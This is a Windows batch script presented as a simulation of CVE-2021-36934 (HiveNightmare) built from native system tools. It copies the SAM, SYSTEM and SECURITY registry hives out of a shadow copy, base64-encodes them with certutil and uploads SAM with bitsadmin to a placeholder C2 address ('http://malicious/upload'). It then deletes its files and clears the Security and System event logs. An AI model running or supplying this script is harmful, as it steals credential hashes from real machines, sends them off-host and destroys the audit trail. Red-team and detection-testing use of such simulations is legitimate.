@echo off
REM Ap3x CVE-2021-36934 Simulation using Windows 11 LOLBins
REM Target: Windows 11 vulnerable builds with improper ACLs on shadow copies

REM PHASE 1: ENUMERATION
echo [*] Listing Volume Shadow Copies...
vssadmin list shadows

echo [*] Checking access permissions on registry hives...
icacls "C:\Windows\System32\config\SAM"
icacls "C:\Windows\System32\config\SYSTEM"
icacls "C:\Windows\System32\config\SECURITY"

REM PHASE 2: SHADOW COPY ENUMERATION & EXTRACTION
set /p SHADOWID=Enter the Shadow Copy ID (number after HarddiskVolumeShadowCopy):

set SHADOWPATH=\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%SHADOWID%\Windows\System32\config

echo [*] Listing files in shadow copy: %SHADOWPATH%
cmd /c dir "%SHADOWPATH%"

if not exist C:\loot mkdir C:\loot

echo [*] Copying registry hives from shadow copy...
copy "%SHADOWPATH%\SAM" C:\loot\SAM.bak
copy "%SHADOWPATH%\SYSTEM" C:\loot\SYSTEM.bak
copy "%SHADOWPATH%\SECURITY" C:\loot\SECURITY.bak

REM PHASE 3: ENCODING AND EXFIL PREP
echo [*] Encoding hives for exfiltration...
certutil -encode C:\loot\SAM.bak C:\loot\SAM.b64
certutil -encode C:\loot\SYSTEM.bak C:\loot\SYSTEM.b64
certutil -encode C:\loot\SECURITY.bak C:\loot\SECURITY.b64

REM Simulate exfiltration (replace URL with your C2 endpoint)
set C2URL=http://malicious/upload
echo [*] Simulating exfiltration to %C2URL%
bitsadmin /transfer hivejob /upload /priority foreground C:\loot\SAM.b64 %C2URL%/SAM.b64

REM PHASE 4: CLEANUP
echo [*] Removing dropped files...
del /f /q C:\loot\*.bak
del /f /q C:\loot\*.b64

REM Optional evasion: Clear logs
echo [*] Clearing logs (optional)...
wevtutil cl Security
wevtutil cl System

echo [*] Done.
pause
